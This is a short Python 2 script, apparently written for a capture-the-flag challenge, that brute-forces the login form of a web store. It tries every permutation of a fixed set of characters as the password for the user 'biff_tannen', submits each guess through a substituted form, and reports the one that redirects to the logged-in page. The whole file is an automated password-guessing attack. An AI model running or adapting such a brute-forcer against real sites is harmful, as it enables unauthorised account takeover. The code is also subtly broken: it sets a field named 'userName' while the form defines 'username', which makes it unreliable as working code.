#!/usr/bin/python
import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

combos=itertools.permutations("i34U^hP-",8)
r =br.open("https://store.delorean.codes/u/amaysaxena/login")

for x in combos:
	new_form = '''
	<form method="POST" action="/u/amaysaxena/login">
  <table>
    <tr>
      <td class="fs">user</td>
      <td>
        <select name="username">

          <option value="marty_mcfly">Marty McFly</option>

          <option value="biff_tannen">Biff Tannen</option>

        </select>
      </td>
    </tr>
    <tr>
      <td class="fs">password</td>
      <td><input type="password" name="password" /></td>
    </tr>
  </table>
	<input type="submit" value="Login" />
</form>
	'''

	#all you have to take care is they have the same name for input fields and submit button
	r.set_data(new_form)
	br.set_response(r)
	br.select_form( nr = 0 )
	br.form['userName'] = "biff_tannen"
	br.form['password'] = ''.join(x)
	print "Checking ",br.form['password']
	response=br.submit()
	if response.geturl()=="https://store.delorean.codes/u/amaysaxena/":
		#url to which the page is redirected after login
		print "Correct password is ",''.join(x)
		break